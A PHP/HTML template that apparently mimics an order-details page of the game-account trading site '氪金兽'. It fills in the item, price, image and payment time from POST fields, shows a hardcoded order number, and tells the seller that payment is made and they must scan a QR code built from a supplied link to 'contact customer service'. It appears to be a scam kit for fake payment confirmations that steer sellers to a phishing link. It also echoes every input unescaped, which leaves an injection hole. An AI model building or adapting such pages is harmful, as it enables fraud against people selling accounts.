<!DOCTYPE html>
<?php
if (isset($_POST['tj'])) {
    $bt = $_POST['bt'];
    $je = $_POST['je'];
    $lj = $_POST['lj'];
    $tp = $_POST['tp'];
    $sj = $_POST['sj'];
    $nr= $_POST['nr'];
    $mjmc = $_POST['mjmc'];
    $sj1 = $_POST['sj1'];
}
?>
<html lang="zh">
	<head>
		<meta charset="UTF-8">
		<meta name="viewport" content="width=device-width, initial-scale=1.0">
		<title>氪金兽</title>
		<link rel="stylesheet" href="/css/kjsfxt.css" />
	</head>
	<body>
		<div class="box">
			<div class="bxs">
				<div class="fanhto">
					<img src="https://pic.imgdb.cn/item/65c3c1769f345e8d03a9e377.jpgu," alt="" />
					<h3>订单详情</h3>
				</div>
				<div class="spxq">
					<div class="sptp">
						<img src="<?php echo $tp?>"
							alt="" />
					</div>
					<div class="sp">
						<div class="bt">
							<p>
							    <?php echo $bt?>
							<p>
						</div>
						<div class="spxs">
							<div class="bzd">
							<?php echo $nr?>
							</div>
							<div class="jg">
								<p>
									￥<?php echo $je?>
								</p>
							</div>
						</div>
					</div>
				</div>
				<div class="bzaq">
					<div class="bhlogo">
						<img src="https://pic.imgdb.cn/item/65c3d3a89f345e8d03d37d45.jpg" alt="" />
						<p>四大防线，保障安全，永久包赔，找回全额退款</p>
					</div>
					<div class="bzgf">
						<div class="fanh"></div>
					</div>
				</div>
				<div class="jiaoyiliuc">
					<div class="jylc">
						<h4>交易流程</h4>
						<div style="border: 2px solid #a3a3a3;border-left: none;border-bottom: none;" class="fanh">
						</div>
					</div>
					<div class="jy">
						<div class="jil">
							<div class="jiaoyiyuan">
								<div class="yuan">
									<div></div>
								</div>
							</div>
							<div class="jiaoyixian">
								<div></div>
							</div>
							<div class="jiaoyiyuan">
								<div class="yuan">
									<div></div>
								</div>
							</div>
							<div class="jiaoyixian">
								<div></div>
							</div>
							<div class="jiaoyiyuan">
								<div class="yuan">
									<div></div>
								</div>
							</div>
							<div class="jiaoyixian">
								<div></div>
							</div>
							<div class="jiaoyiyuan">
								<div class="yuan">
									<div></div>
								</div>
							</div>
							<div class="jiaoyixian">
								<div></div>
							</div>
							<div class="jiaoyiyuan">
								<div class="yuan">
									<div></div>
								</div>
							</div>
							<div style="position: absolute;" class="jyjs">
								<p>下单</p>
								<p>签订合同</p>
								<p style="position: relative;right: 10px;">验号</p>
								<p style="position:relative;right:2px">换绑</p>
								<p style="position:relative;left:5px">完成</p>
							</div>
						</div>
					</div>
					<p class="ts">已付款，等待卖家配合客服验号</p>
				</div>
				<div class="saom">
				    <p id="xsccs" style="color:#5468fc;margin-top:10px;margin-left:12px">本次交易需要卖家使用微信或支付宝APP扫码联系客服</p>
					<div class="bxscs">
					    <div class="jies">
						<p class="zy">温馨提示：当前处于下单高峰期可能会出现延迟显示订单等特殊情况</p>
						<button>联系客服</button>
					</div>
					<div class="ma">
						<img src="https://api.qrtool.cn/?text=<?php echo $lj?>" alt="" />
					</div>
					</div>
				</div> 
				<div class="ddxq">
					<div></div>
					<h4>订单详情</h4>
				</div>
				<div class="dd">
					<div class="xq">
						<p id="hs">商品金额</p>
						<p class="red">￥<?php echo $je?></p>
					</div>
					<div class="xq">
						<p id="hs">实付金额</p>
						<p class="red">￥<?php echo $je?></p>
					</div>
					<div class="xq">
						<p id="hs">订单状态</p>
						<p class="ls">待验号</p>
					</div>
				</div>
				<div class="dd">
					<div class="xq">
						<p>订单编号</p>
						<p id="hss">456789</p>
					</div>
					<div class="xq">
						<p>支付时间</p>
						<p id="hss"><?php echo $sj;echo ' ';echo $sj1;?></p>
					</div>
				</div>
			</div>
		</div>
	</body>
</html>